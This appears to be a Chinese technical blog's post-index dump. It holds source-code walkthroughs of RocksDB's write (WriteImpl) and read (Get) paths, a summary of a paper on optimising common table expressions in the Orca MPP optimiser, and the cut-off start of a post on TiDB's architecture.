代表一个事务的提交，可以包含多条操作，可以通过调用 WriteBatch::Put/Delete 等操作将对应多条的 key/value 记录加入 WriteBatch 中。 源码分析WriteThread::JoinBatchGroup12345678910111213141516171819202122232425262728293031323334static WriteThread::AdaptationContext jbg_ctx(&quot;JoinBatchGroup&quot;);void WriteThread::JoinBatchGroup(Writer* w) { TEST_SYNC_POINT_CALLBACK(&quot;WriteThread::JoinBatchGroup:Start&quot;, w); assert(w-&gt;batch != nullptr); bool linked_as_leader = LinkOne(w, &amp;newest_writer_); if (linked_as_leader) { SetState(w, STATE_GROUP_LEADER); } TEST_SYNC_POINT_CALLBACK(&quot;WriteThread::JoinBatchGroup:Wait&quot;, w); if (!linked_as_leader) { /** * Wait util: * 1) An existing leader pick us as the new leader when it finishes * 2) An existing leader pick us as its follewer and * 2.1) finishes the memtable writes on our behalf * 2.2) Or tell us to finish the memtable writes in pralallel * 3) (pipelined write) An existing leader pick us as its follower and * finish book-keeping and WAL write for us, enqueue us as pending * memtable writer, and * 3.1) we become memtable writer group leader, or * 3.2) an existing memtable writer group leader tell us to finish memtable * writes in parallel. */ TEST_SYNC_POINT_CALLBACK(&quot;WriteThread::JoinBatchGroup:BeganWaiting&quot;, w); AwaitState(w, STATE_GROUP_LEADER | STATE_MEMTABLE_WRITER_LEADER | STATE_PARALLEL_MEMTABLE_WRITER | STATE_COMPLETED, &amp;jbg_ctx); TEST_SYNC_POINT_CALLBACK(&quot;WriteThread::JoinBatchGroup:DoneWaiting&quot;, w); }} 每个事务提交请求都会生成一个 WriteBatch 对象，进入 WriteImpl 函数后各自的线程首先调用 JoinBatchGroup 来加入到队列。该队列主要核心的实现在于 LinkOne 函数，通过 CAS 无锁将多个线程的请求组成请求链表： 123456789101112131415161718192021222324252627282930313233bool WriteThread::LinkOne(Writer* w, std::atomic&lt;Writer*&gt;* newest_writer) { assert(newest_writer != nullptr); assert(w-&gt;state == STATE_INIT); Writer* writers = newest_writer-&gt;load(std::memory_order_relaxed); while (true) { // If write stall in effect, and w-&gt;no_slowdown is not true, // block here until stall is cleared. If its true, then return // immediately if (writers == &amp;write_stall_dummy_) { if (w-&gt;no_slowdown) { w-&gt;status = Status::Incomplete(&quot;Write stall&quot;); SetState(w, STATE_COMPLETED); return false; } // Since no_slowdown is false, wait here to be notified of the write // stall clearing { MutexLock lock(&amp;stall_mu_); writers = newest_writer-&gt;load(std::memory_order_relaxed); if (writers == &amp;write_stall_dummy_) { stall_cv_.Wait(); // Load newest_writers_ again since it may have changed writers = newest_writer-&gt;load(std::memory_order_relaxed); continue; } } } w-&gt;link_older = writers; if (newest_writer-&gt;compare_exchange_weak(writers, w)) { return (writers == nullptr); } }} write_group 链表结构如下： 每个 writer 在头部插入，插入时如果发现 link_older 为空，则此 writer 成为 write_group 的 Leader（即链表尾为 Leader）。 在 JoinBatchGroup 中，如果 writer 不是 Leader（在后文把不是 Leader 的 writer 称为 Follower），则会调用 AwaitState 等待被唤醒。 PS：由于条件锁 Context Switches 代价高，Rocksdb 在 AwaitState 也做了优化，将 pthread_cond_wait 拆成 3 步来做，本文不对该优化进行详细描述。 WriteImpl 写日志1234567891011121314151617181920212223242526if (w.state == WriteThread::STATE_GROUP_LEADER) { ... last_batch_group_size_ = write_thread_.EnterAsBatchGroupLeader(&amp;w, &amp;wal_write_group); const SequenceNumber current_sequence = write_thread_.UpdateLastSequence(versions_-&gt;LastSequence()) + 1; ... if (w.status.ok() &amp;&amp; !write_options.disableWAL) { PERF_TIMER_GUARD(write_wal_time); stats-&gt;AddDBStats(InternalStats::kIntStatsWriteDoneBySelf, 1); RecordTick(stats_, WRITE_DONE_BY_SELF, 1); if (wal_write_group.size &gt; 1) { stats-&gt;AddDBStats(InternalStats::kIntStatsWriteDoneByOther, wal_write_group.size - 1); RecordTick(stats_, WRITE_DONE_BY_OTHER, wal_write_group.size - 1); } w.status = WriteToWAL(wal_write_group, log_writer, log_used, need_log_sync, need_log_dir_sync, current_sequence); } ... write_thread_.ExitAsBatchGroupLeader(wal_write_group, w.status);} 成为 Leader 的 writer，负责批量写入 WAL。在写 WAL 前，首先调用 EnterAsBatchGroupLeader 函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778size_t WriteThread::EnterAsBatchGroupLeader(Writer* leader, WriteGroup* write_group) { assert(leader-&gt;link_older == nullptr); assert(leader-&gt;batch != nullptr); assert(write_group != nullptr); size_t size = WriteBatchInternal::ByteSize(leader-&gt;batch); // Allow the group to grow up to a maximum size, but if the // original write is small, limit the growth so we do not slow // down the small write too much. size_t max_size = max_write_batch_group_size_bytes; const uint64_t min_batch_size_bytes = max_write_batch_group_size_bytes / 8; if (size &lt;= min_batch_size_bytes) { max_size = size + min_batch_size_bytes; } leader-&gt;write_group = write_group; write_group-&gt;leader = leader; write_group-&gt;last_writer = leader; write_group-&gt;size = 1; Writer* newest_writer = newest_writer_.load(std::memory_order_acquire); // This is safe regardless of any db mutex status of the caller. Previous // calls to ExitAsGroupLeader either didn't call CreateMissingNewerLinks // (they emptied the list and then we added ourself as leader) or had to // explicitly wake us up (the list was non-empty when we added ourself, // so we have already received our MarkJoined). CreateMissingNewerLinks(newest_writer); // Tricky. Iteration start (leader) is exclusive and finish // (newest_writer) is inclusive. Iteration goes from old to new. Writer* w = leader; while (w != newest_writer) { w = w-&gt;link_newer; if (w-&gt;sync &amp;&amp; !leader-&gt;sync) { // Do not include a sync write into a batch handled by a non-sync write. break; } if (w-&gt;no_slowdown != leader-&gt;no_slowdown) { // Do not mix writes that are ok with delays with the ones that // request fail on delays. break; } if (w-&gt;disable_wal != leader-&gt;disable_wal) { // Do not mix writes that enable WAL with the ones whose // WAL disabled. break; } if (w-&gt;batch == nullptr) { // Do not include those writes with nullptr batch. Those are not writes, // those are something else. They want to be alone break; } if (w-&gt;callback != nullptr &amp;&amp; !w-&gt;callback-&gt;AllowWriteBatching()) { // dont batch writes that don't want to be batched break; } auto batch_size = WriteBatchInternal::ByteSize(w-&gt;batch); if (size + batch_size &gt; max_size) { // Do not make batch too big break; } w-&gt;write_group = write_group; size += batch_size; write_group-&gt;last_writer = w; write_group-&gt;size++; } TEST_SYNC_POINT_CALLBACK(&quot;WriteThread::EnterAsBatchGroupLeader:End&quot;, w); return size;} 在这里，通过 CreateMissingNewerLinks 函数来生成一个双向链表，使得可以从 Leader 开始顺序写。创建完成反向写请求链表之后，则开始计算有多少个写请求可以批量的进行，同时更新 write_group 中的批量写尺寸以及个数等信息，EnterAsBatchGroupLeader 取队列时会把此刻所有的 writer 一次性全取完。 该操作完成之后，则进入写 WAL 的流程了。调用 WriteToWAL，在 MergeBatch 函数中，将根据 write_group 生成一个 merged_batch，该 merged_batch 中记录着应当被写入 WAL 的内容。接着就通过 WriteToWAL 将 merged_batch 写入 WAL 中，这里会根据是否设置了 sync 来决定是否对 WAL 进行落盘操作。 PS：这里有一个优化点，在生成 merged_batch 的时候，假设该写请求的尺寸为一并且该请求需要写 WAL，则 merged_batch 直接复用了该写请求；反之则会复用一个 tmp_batch_ 对象避免频繁的生成 WriteBatch 对象。在写完 WAL 之后，假设复用了 tmp_batch_，则会清空该对象。 最后，调用 ExitAsBatchGroupLeader，该函数会决定该 Leader 是否为 STATE_MEMTABLE_WRITER_LEADER（MEMTABLE_WRITER_LEADER数量 &lt;= GROUP_LEADER数量），从而进行写 Memtable 流程。 WriteImpl 写 Memtable1234567891011121314151617181920212223242526272829303132333435WriteThread::WriteGroup memtable_write_group; if (w.state == WriteThread::STATE_MEMTABLE_WRITER_LEADER) { PERF_TIMER_GUARD(write_memtable_time); assert(w.ShouldWriteToMemtable()); write_thread_.EnterAsMemTableWriter(&amp;w, &amp;memtable_write_group); if (memtable_write_group.size &gt; 1 &amp;&amp; immutable_db_options_.allow_concurrent_memtable_write) { write_thread_.LaunchParallelMemTableWriters(&amp;memtable_write_group); } else { memtable_write_group.status = WriteBatchInternal::InsertInto( memtable_write_group, w.sequence, column_family_memtables_.get(), &amp;flush_scheduler_, &amp;trim_history_scheduler_, write_options.ignore_missing_column_families, 0 /*log_number*/, this, false /*concurrent_memtable_writes*/, seq_per_batch_, batch_per_txn_); versions_-&gt;SetLastSequence(memtable_write_group.last_sequence); write_thread_.ExitAsMemTableWriter(&amp;w, memtable_write_group); } } if (w.state == WriteThread::STATE_PARALLEL_MEMTABLE_WRITER) { assert(w.ShouldWriteToMemtable()); ColumnFamilyMemTablesImpl column_family_memtables( versions_-&gt;GetColumnFamilySet()); w.status = WriteBatchInternal::InsertInto( &amp;w, w.sequence, &amp;column_family_memtables, &amp;flush_scheduler_, &amp;trim_history_scheduler_, write_options.ignore_missing_column_families, 0 /*log_number*/, this, true /*concurrent_memtable_writes*/, false /*seq_per_batch*/, 0 /*batch_cnt*/, true /*batch_per_txn*/, write_options.memtable_insert_hint_per_batch); if (write_thread_.CompleteParallelMemTableWriter(&amp;w)) { MemTableInsertStatusCheck(w.status); versions_-&gt;SetLastSequence(w.write_group-&gt;last_sequence); write_thread_.ExitAsMemTableWriter(&amp;w, *w.write_group); } } RocksDB 有一个 allow_concurrent_memtable_write 的配置项，开启后可以并发写 memtable（memtable 能设置并发写，但是 WAL 文件不能，因为 WAL 是一个追加写的文件，多个 writer 必须要串行化），所以接下来分为串行写和并行写来进行分析。 串行写 MemtableLeader 调用 InsertInto，对 write_group 进行遍历，将 Leader 和 Follower 的 WriteBatch 写入。之后调用 ExitAsMemTableWriter，把所有 Follower 的状态设置为 STATE_COMPLETED，将它们唤醒，最后再把 Leader 的状态设置为 STATE_COMPLETED。 并行写 Memtable调用 LaunchParallelMemTableWriters，遍历 write_group 把 Leader 和 Follower 的状态都设置为 STATE_PARALLEL_MEMTABLE_WRITER，将等待的线程唤醒。最后所有 writer 通过调用 InsertInto 来将 WriteBatch 写入 MemTable 中。writer 完成了 MemTable 的写操作之后，都会调用 CompleteParallelMemTableWriter 函数。该函数会将该 write_group 中运行的任务数减一，当运行中的任务数为零的时候就代表了所有的线程都完成了操作，调用 ExitAsMemTableWriter 把 Leader 的状态设置为 STATE_COMPLETED，反之则会进入等待状态，等待当前其他的写任务完成。 无论是串行写还是并行写，写入 MemTable 完成之后，还有一项工作，就是在取队列时获取 newest_writer_ 和当前时间点处，可能又有很多的写请求产生了，所以批量任务中最后一个完成的线程必须负责重新指定 Leader 给堆积写请求链表的尾部，让其接过 Leader 角色继续进行批量提交。可以看到，串行写和并行写最后都会调用 ExitAsMemTableWriter，正是在该函数中完成了该项工作。 PS：在高并发场景下，Follow 调用 AwaitState 的平均等待时延差不多是写 WAL 时延的两倍。因为获取 newest_writer_ 后，可能又来了许多写请求，这些写请求先要等待此时的 Leader 完成写流程，还要等待下个 Leader，也就是和这些写请求是同一个 write_group 的 Leader 完成写 WAL 才能被唤醒。 回顾 参考 Rocksdb Source Code 6.7.3 rocksdb写流程DBImpl::WriteImpl()源代码分析 RocksDB写入流程 RocksDB 写流程分析","link":"/2021/04/05/RocksDB-WriteImpl-%E6%B5%81%E7%A8%8B/"},{"title":"RocksDB Get 流程","text":"本文对 RocksDB 6.7.3 版本的 Get 流程进行分析。 概述(1) 获取当前的 SuperVersion。SuperVersion 用于管理 CF 的元数据，如当前版本号、内存中的 MemTable 和 Immutable MemTable、SST 文件信息等: 123456Struct SuperVersion { MemTable* mem; MemTableListVersion* imm; Version* current; ...} (2) 从内存读: 尝试从第一步 SuperVersion 中引用的 MemTable 以及Immutable MemTable 中获取对应的值 (3) 从持久化设备读: 首先通过 Table cache 获取到文件的元数据，如布隆过滤器(Bloom Filters)和数据块索引(Indexes)， 如果 Block cache 中缓存了 SST 的数据块，如果命中那就直接读取成功，否则便需要从 SST 中读取数据块并插入到 Block cache 源码分析DBImpl::Get12345678Status DBImpl::Get(const ReadOptions&amp; read_options, ColumnFamilyHandle* column_family, const Slice&amp; key, PinnableSlice* value) { GetImplOptions get_impl_options; get_impl_options.column_family = column_family; get_impl_options.value = value; return GetImpl(read_options, key, get_impl_options);} Rocksdb 的 Get 接口 DBImpl::Get 其实现主要靠 DBImpl::GetImpl 函数调用。 DBImpl::GetImpl1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950Status DBImpl::GetImpl(const ReadOptions&amp; read_options, const Slice&amp; key, ... SuperVersion* sv = GetAndRefSuperVersion(cfd); ... SequenceNumber snapshot; if (read_options.snapshot != nullptr) { if (get_impl_options.callback) { snapshot = get_impl_options. } else { snapshot = reinterpret_cast&lt;const SnapshotImpl*&gt;(read_options.snapshot)-&gt;number_; } } else { .... snapshot = last_seq_same_as_publish_seq_ ? versions_-&gt;LastSequence() : versions_-&gt;LastPublishedSequence(); ... } } ... if (!skip_memtable) { ... if (sv-&gt;mem-&gt;Get(lkey, get_impl_options.value-&gt;GetSelf(), &amp;s, &amp;merge_context, &amp;max_covering_tombstone_seq, read_options, get_impl_options.callback, get_impl_options.is_blob_index)) { ... } else if ((s.ok() || s.IsMergeInProgress()) &amp;&amp; sv-&gt;imm-&gt;Get(lkey, get_impl_options.value-&gt;GetSelf(), &amp;s, &amp;merge_context, &amp;max_covering_tombstone_seq, read_options, get_impl_options.callback, get_impl_options.is_blob_index)) { ... } ... } if (!done) { sv-&gt;current-&gt;Get( read_options, lkey, get_impl_options.value, &amp;s, &amp;merge_context, &amp;max_covering_tombstone_seq, get_impl_options.get_value ? get_impl_options.value_found : nullptr, nullptr, nullptr, get_impl_options.get_value ? get_impl_options.callback : nullptr, get_impl_options.get_value ? get_impl_options.is_blob_index : nullptr, get_impl_options.get_value); ... } ...} DBImpl::GetImpl 获取 SuperVersion 的信息，如果用户未指定 snapshot，需要获取当前的 snapshot。读取时不对 key 加锁，能读到什么数据完全取决于 Options 传入的 snapshot。 SuperVersion 中按照数据的新旧程度排序 MemTable -&gt; MemTableListVersion -&gt; Version，依次按序查找，如果在新的数据中找到符合 snapshot 规则的结果，就可以立即返回，完成本次查找。 MemTable::Get123456789101112131415161718192021222324252627282930313233bool MemTable::Get(const LookupKey&amp; key, std::string* value, Status* s, MergeContext* merge_context, SequenceNumber* max_covering_tombstone_seq, SequenceNumber* seq, const ReadOptions&amp; read_opts, ReadCallback* callback, bool* is_blob_index, bool do_merge) { ... if (bloom_filter_ &amp;&amp; !may_contain) { // iter is null if prefix bloom says the key does not exist PERF_COUNTER_ADD(bloom_memtable_miss_count, 1); *seq = kMaxSequenceNumber; } else { if (bloom_filter_) { PERF_COUNTER_ADD(bloom_memtable_hit_count, 1); } GetFromTable(key, *max_covering_tombstone_seq, do_merge, callback, is_blob_index, value, s, merge_context, seq, &amp;found_final_value, &amp;merge_in_progress); } ...}void MemTable::GetFromTable(const LookupKey&amp; key, SequenceNumber max_covering_tombstone_seq, bool do_merge, ReadCallback* callback, bool* is_blob_index, std::string* value, Status* s, MergeContext* merge_context, SequenceNumber* seq, bool* found_final_value, bool* merge_in_progress) { ... table_-&gt;Get(key, &amp;saver, SaveValue); *seq = saver.seq;} 利用 MemTableRep 的 Get 函数进行查找（以 SkipListRep 实现为例，在 skiplist 中进行查找，从 seek 到的位置开始向后遍历，遍历 entry 是否符合SaveValue 定义的规则）。SaveValue 函数查看当前 entry 是否还是当前查找的 key，如果不是则返回；查看当前 entry 的 snapshot 是否小于或等于需要查找的 snapshot，不符合则继续循环。如果 entry 的snapshot 符合上述条件，那么则跳出循环，返回查找结果。 MemTableListVersion::Get123456789bool Get(const LookupKey&amp; key, std::string* value, Status* s, MergeContext* merge_context, SequenceNumber* max_covering_tombstone_seq, const ReadOptions&amp; read_opts, ReadCallback* callback = nullptr, bool* is_blob_index = nullptr) { SequenceNumber seq; return Get(key, value, s, merge_context, max_covering_tombstone_seq, &amp;seq, read_opts, callback, is_blob_index);} MemTableListVersion 用链表的形式保存了所有 Immutable memtable 的结构，查找时，按时间序依次查找于每一个 memtable，如果任何一个 memtable 查找到结果则立即返回，即返回最新的返回值。具体 memtable 查找见上述 MemTable::Get 接口。 Version::Get123456789101112131415161718192021222324252627void Version::Get(const ReadOptions&amp; read_options, const LookupKey&amp; k, PinnableSlice* value, Status* status, MergeContext* merge_context, SequenceNumber* max_covering_tombstone_seq, bool* value_found, bool* key_exists, SequenceNumber* seq, ReadCallback* callback, bool* is_blob, bool do_merge) { ... FilePicker fp( storage_info_.files_, user_key, ikey, &amp;storage_info_.level_files_brief_, storage_info_.num_non_empty_levels_, &amp;storage_info_.file_indexer_, user_comparator(), internal_comparator()); FdWithKeyRange* f = fp.GetNextFile(); while (f != nullptr) { ... *status = table_cache_-&gt;Get( read_options, *internal_comparator(), *f-&gt;file_metadata, ikey, &amp;get_context, mutable_cf_options_.prefix_extractor.get(), cfd_-&gt;internal_stats()-&gt;GetFileReadHist(fp.GetHitFileLevel()), IsFilterSkipped(static_cast&lt;int&gt;(fp.GetHitFileLevel()), fp.IsHitFileLastInLevel()), fp.GetCurrentLevel()); ... f = fp.GetNextFile(); } ...} GetNextFile 函数会遍历所有的 level，然后再遍历每个 level 的所有的文件，这里会对 level 0 的文件做一个特殊处理，这是因为只有 level 0 的 SST 的 range 不是有序的，因此我们每次查找需要查找所有的文件，也就是会一个个的遍历；而在非 level 0，我们只需要按照二分查找来得到对应的文件即可，如果二分查找不存在，那么我就需要进入下一个 level 进行查找。 调用 TableCache::Get 遍历单个 SST 文件，如果查找到结果立即返回。 TableCache::Get123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109Status TableCache::Get(const ReadOptions&amp; options, const InternalKeyComparator&amp; internal_comparator, const FileMetaData&amp; file_meta, const Slice&amp; k, GetContext* get_context, const SliceTransform* prefix_extractor, HistogramImpl* file_read_hist, bool skip_filters, int level) { auto&amp; fd = file_meta.fd; std::string* row_cache_entry = nullptr; bool done = false;#ifndef ROCKSDB_LITE IterKey row_cache_key; std::string row_cache_entry_buffer; // Check row cache if enabled. Since row cache does not currently store // sequence numbers, we cannot use it if we need to fetch the sequence. if (ioptions_.row_cache &amp;&amp; !get_context-&gt;NeedToReadSequence()) { auto user_key = ExtractUserKey(k); CreateRowCacheKeyPrefix(options, fd, k, get_context, row_cache_key); done = GetFromRowCache(user_key, row_cache_key, row_cache_key.Size(), get_context); if (!done) { row_cache_entry = &amp;row_cache_entry_buffer; } }#endif // ROCKSDB_LITE Status s; TableReader* t = fd.table_reader; Cache::Handle* handle = nullptr; if (!done &amp;&amp; s.ok()) { if (t == nullptr) { s = FindTable( file_options_, internal_comparator, fd, &amp;handle, prefix_extractor, options.read_tier == kBlockCacheTier /* no_io */, true /* record_read_stats */, file_read_hist, skip_filters, level); if (s.ok()) { t = GetTableReaderFromHandle(handle); } } SequenceNumber* max_covering_tombstone_seq = get_context-&gt;max_covering_tombstone_seq(); if (s.ok() &amp;&amp; max_covering_tombstone_seq != nullptr &amp;&amp; !options.ignore_range_deletions) { std::unique_ptr&lt;FragmentedRangeTombstoneIterator&gt; range_del_iter( t-&gt;NewRangeTombstoneIterator(options)); if (range_del_iter != nullptr) { *max_covering_tombstone_seq = std::max( *max_covering_tombstone_seq, range_del_iter-&gt;MaxCoveringTombstoneSeqnum(ExtractUserKey(k))); } } if (s.ok()) { get_context-&gt;SetReplayLog(row_cache_entry); // nullptr if no cache. s = t-&gt;Get(options, k, get_context, prefix_extractor, skip_filters); get_context-&gt;SetReplayLog(nullptr); } else if (options.read_tier == kBlockCacheTier &amp;&amp; s.IsIncomplete()) { // Couldn't find Table in cache but treat as kFound if no_io set get_context-&gt;MarkKeyMayExist(); s = Status::OK(); done = true; } }#ifndef ROCKSDB_LITE // Put the replay log in row cache only if something was found. if (!done &amp;&amp; s.ok() &amp;&amp; row_cache_entry &amp;&amp; !row_cache_entry-&gt;empty()) { size_t charge = row_cache_key.Size() + row_cache_entry-&gt;size() + sizeof(std::string); void* row_ptr = new std::string(std::move(*row_cache_entry)); ioptions_.row_cache-&gt;Insert(row_cache_key.GetUserKey(), row_ptr, charge, &amp;DeleteEntry&lt;std::string&gt;); }#endif // ROCKSDB_LITE if (handle != nullptr) { ReleaseHandle(handle); } return s;}Status TableCache::FindTable(const FileOptions&amp; file_options, const InternalKeyComparator&amp; internal_comparator, const FileDescriptor&amp; fd, Cache::Handle** handle, const SliceTransform* prefix_extractor, const bool no_io, bool record_read_stats, HistogramImpl* file_read_hist, bool skip_filters, int level, bool prefetch_index_and_filter_in_cache) { ... std::unique_ptr&lt;TableReader&gt; table_reader; s = GetTableReader(file_options, internal_comparator, fd, false /* sequential mode */, record_read_stats, file_read_hist, &amp;table_reader, prefix_extractor, skip_filters, level, prefetch_index_and_filter_in_cache); if (!s.ok()) { assert(table_reader == nullptr); RecordTick(ioptions_.statistics, NO_FILE_ERRORS); // We do not cache error results so that if the error is transient, // or somebody repairs the file, we recover automatically. } else { s = cache_-&gt;Insert(key, table_reader.get(), 1, &amp;DeleteEntry&lt;TableReader&gt;, handle); if (s.ok()) { // Release ownership of table reader. table_reader.release(); } ... return s;} 如果 row_cache 打开，首先它会计算 row cache 的 key，再在row cache 中进行一次查找，如果有对应的值则直接返回结果，否则则将会在对应的 SST 读取传递进来的 key。 调用 FindTable，进行对应 table_reader 的读取以及进行 Table cache。 接下来调用 t-&gt;Get，从 Block cache 或者 SST 中读取数据。 最后，如果 row_cache 打开，把读取的数据插入到 row cache 中。 BlockBasedTable::Get12345678for (iiter-&gt;Seek(key); iiter-&gt;Valid()&amp;&amp;!done; iiter-&gt;Next()) { ... NewDataBlockIterator(&amp;biter); for(; biter.Valid; biter.Next()) { ... get_context-&gt;SaveValue(biter-&gt;Value()); }} 在 Table Cache 中，假设最终缓存的 table reader 是一个 BlockBasedTable 对象，调用 BlockBasedTable::Get。 首先，根据 Table 的元数据信息（布隆过滤器，数据块Index）查找 SST 内部的 Block。 调用 NewDataBlockIterator，若 Block 在 Block Cache 当中，直接返回对象地址，否则，发生磁盘IO，读取 SST 的 Block，构造 Block 对象并缓存其地址在 Block Cache 中。 找到 key 对应的 value，调用 get_context-&gt;SaveValue，直接将 Block 中的数据地址赋给用户传进来的 PinnableSlice* 中，减少了一次数据拷贝，并用引用计数避免 Block 被淘汰值被清除。 回顾 参考 Rocksdb Source Code 6.7.3 Rocksdb Code Analysis Get MySQL · RocksDB · 数据的读取(二) 使用PinnableSlice减少Get时的内存拷贝","link":"/2021/01/17/Rocksdb-Get/"},{"title":"Optimization of Common Table Expressions in MPP Database Systems 概述","text":"背景论文基于 Orca 对非递归的 CTE 进行了形式化表达和优化，贡献总结如下： 在查询中使用 CTE 的上下文中优化 CTE 对于查询中的每个 CTE 引用，CTE 不会每次重新优化，仅在需要的时候才进行，例如下推 fitlers 或者 sort 操作 基于 cost 来决定是否对 CTE 进行内联 减少 plan 的搜索空间，加速查询执行，包括下推 predicates 到 CTE，如果 CTE 被引用一次则始终内联，消除掉没有被引用的 CTE 避免死锁，保证 CTE producer 在 CTE consumer 之前执行 REPRESENTATION OF CTEs CTEProducer：一个 CTE 定义对应一个 CTEProducer CTEConsumer：query 中引用 CTE 的地方 CTEAnchor：query 中定义 CTE 的 node，CTE 只能被该 CTEAnchor 的子树中引用 Sequence：按序执行它的孩子节点，先执行左节点，再执行右节点，并把右节点做为返回值 对于此查询： 123WITH v AS (SELECT i_brand FROM item WHERE i_color = ’red’)SELECT * FROM v as v1, v as v2WHERE v1.i_brand = v2.i_brand; 它的 Logical representation 如下所示： 它的 Execution plans 如下所示： PLAN ENUMERATIONCTE 是否内联需要取决于 cost，因此需要枚举出 CTE 在不同引用地方内联前后的计划代价。Orca 中定义了 Memo，下图是初始的逻辑查询在 Memo 中的结构，每个编号就是一个 Memo Group： Transformation RulesTransformation Rules 可以看做 Memo Group 一个输入（或者一个函数），Memo Group 根据这个规则展开产生另一些 expression 放在同一个 Memo Group 中。对于每个 CTE，我们生成内联或不内联 CTE 的备选方案。 第一条规则应用于 CTEAnchor 运算符。它在 Group 0 中生成一个 Sequence 操作符，这样序列的左节点就是表示 CTE 定义的整个 Plan Tree —— 根据需要创建尽可能多的新 Group (Group 4、5和6) —— 序列的右节点就是 CTEAnchor (Group 1) 的原始节点。 第二条规则也应用于 CTEAnchor，生成 Group 0 中的 NoOp 运算符，其孩子节点是 CTEAnchor 的孩子节点（Group 1）。 第三条规则应用于 CTEConsumer 运算符，生成 CTE 定义的副本，该副本与 CTEConsumer 属于同一 Group。例如，Group 2 中的 CTEConsumer，添加了 CTE 定义 Select 操作符，并将其子操作符 TableScan 添加到新Group（Group 7）。 该方法产生的 Plan Tree 的组合中并不都是有效的，比如： a 和 b 都没有 CTEProducer；c 有一个 CTEProducer，没有 CTEConsumer；d 中的 Plan 是有效的，但是只有一个 CTEConsumer 对应于包含的 CTEProducer，是一个失败的 Plan。 通过 Memo 的机制来表达不同的 Plan，基于 cost 选择是否内联。在一个 query 中，CTE 可能有的内联，而有的不内联。内联的好处是能进行普通 query 的优化，比如：下推 predicates，distribution，sorting 等。例如： CTEConsumer 上游有 predicate: i_color=’red’，Orca在默认情况下会将谓词下推，使其从表达式 c 变为表达式 d。 Avoiding Invalid Plans上述产生的 Plan Tree 会很多，所以需要裁剪掉一些无效的 Plan，例如，使用了 CTEConsumer 却没有 CTEProducer。裁剪算法如下： CTESpec 表示一个 CTE 的属性对(id, type)，比如：(1, ‘c’)，cteid = 1，type 是 CTEConsumer。该算法简单来说就是遍历 Tree，检查 CTEConsumer 和 CTEProduct 是否配对。具体描述如下： 先计算自身的 CTESpec； 遍历所有子节点： 计算对于该子节点的 CTESpec 的 Request，输入是：前面兄弟节点以及父节点的 specList，来自父节点的 reqParent，得到该子节点应该满足的 reqChild； 子节点调用该函数 DeriveCTEs(child, reqChild)，递归返回子节点的有效的 CTESpecs，即 specChild； 把子节点 DeriveCTE 返回的 specChild 追加到 specList。如果发现有一对 CTEProducer 和 CTEConsumer就从 specList 中去除掉。 对比遍历所有子节点后得到的 specList 与传入的 reqParent 是否 match。如果匹配，则返回当前的 specList。 Optimizations Across Consumers上述算法可以枚举出所有 CTE 是否内联的 Plan，另外还有一些其他优化 CTE 的方法。 Predicate Push-down123456WITH v as (SELECT i_brand, i_color FROM item WHERE i_current_price &lt; 50)SELECT * FROM v v1, v v2WHERE v1.i_brand = v2.i_brandAND v1.i_color = ’red’AND v2.i_color = ’blue’; 把一个 CTEProducer 对应所有的 CTEConsumer 的 predicates，下推到该 CTEProducer 上，条件通过 OR 组合起来，减少物化的数据量。（注意：因为下推到 CTEProducer 的 predicate 是通过 OR 连接的，因此 CTEConsumer 仍然需要执行原来的 predicate。） Always Inlining Single-use CTEs1234WITH v as (SELECT i_color FROM item WHERE i_current_price &lt; 50)SELECT * FROM vWHERE v.i_color = ’red’; 如果只有一个 CTEConsumer，则始终内联 CTE。 Elimination of unused CTEs1234WITH v as (SELECT i_color FROM item WHERE i_current_price &lt; 50)SELECT * FROM itemWHERE item.i_color = ’red’; CTE v 在上述 query 中没有被使用，这种情况可以消除 CTE。另外，对于如下 query： 123456WITH v as (SELECT i_current_price p FROM item WHERE i_current_price &lt; 50), w as (SELECT v1.p FROM v as v1, v as v2 WHERE v1.p &lt; v2.p)SELECT * FROM itemWHERE item.i_color = ’red’; CTE v 被引用了两次，而 CTE w 从未被引用。因此，我们可以消除 w 的定义。并且，这样做去掉了对 v 的唯一引用，这意味着我们还可以消除 v 的定义。 CONTEXTUALIZED OPTIMIZATION对 CTE 是否内联进行枚举之后，Plan 中不同的 CTEConsumer 可能使用不同的优化方案（内联或不内联、下推等）。 Enforcing Physical PropertiesOrca 通过 top-down 发送处理 Memo Group 中的优化请求来优化候选计划。优化请求是一组表达式要满足的 Physical Properties 上的要求，包括 sort order, distribution, rewindability, CTEs 和 data partitioning 等，也可以没有（即 ANY）。下图以 distribution 为例子，CTE 需要在不同的上下文中满足不同的 Physical Properties。 Sequence 算子对 CTEProducer 发射 ANY 的 prop 请求，返回 Hashed(i_sk) 的 prop（表 item 按 i_sk 这一列进行哈希分布）； 上述的 prop 发送到右子树中（结合自身 prop 和父节点的 prop），右子树中的 HashJoin 节点的连接条件需要子节点的数据基于 i_brand 哈希分布，发送请求到 group 2 和 group 3 的 CTEConsumer 中，而 CTEConsumer 并不满足 i_brand 哈希分布的要求，而父节点又需要此 prop，这时就需要在两个 CTEConsumer 分别添加 Redistribute 的算子，把数据按 i_brand 进行哈希，这样才能满足 HashJoin 的要求。 与 (a) 相比，(b) 中可以一开始就要求 CTE 按 i_brand 哈希分布，CTEProducer 会发现数据分布不满足要求，然后就可以在 group 5 中添加 Redistribute 的算子，CTEProducer 返回 Hashed(i_brand)，这样 CTEConsumer 就不需要加上 Redistribute 的算子，最终得到一个最优的计划（CTEProducer 只需要计算一遍并保存数据，两个 CTEConsumer 意味着需要读取两遍数据）。 Cost EstimationCTEProducer 和 CTEConsumer 的 cost 分开计算： CTEProducer 的 cost 是 CTE 自身的 cost，加上物化写磁盘的 cost CTEConsumer 的 cost 是读取物化结果的 cost，类似 scan 算子 参考 El-Helw A, Raghavan V, Soliman M A, et al. Optimization of common table expressions in mpp database systems[J]. Proceedings of the VLDB Endowment, 2015, 8(12): 1704-1715. 《Optimization of Common Table Expressions in MPP Database Systems》论文导读","link":"/2021/07/13/Optimization-of-Common-Table-Expressions-in-MPP-Database-Systems-%E6%A6%82%E8%BF%B0/"},{"title":"TiDB 架构","text":"TiDB是支持MySQL语法的开源分布式混合事务/分析处理（HTAP）数据库。TiDB 可以提供水平可扩展性、强一致性和高可用性。它主要由 PingCAP 公司开发和支持，并在 Apache 2.0 下授权。TiDB 从 Google 的 Spanner 和 F1 论文中汲取了最初的设计灵感。 HTAP 是 Hybrid Transactional / Analytical Processing 的缩写。这个词汇在 2014 年由 Gartner 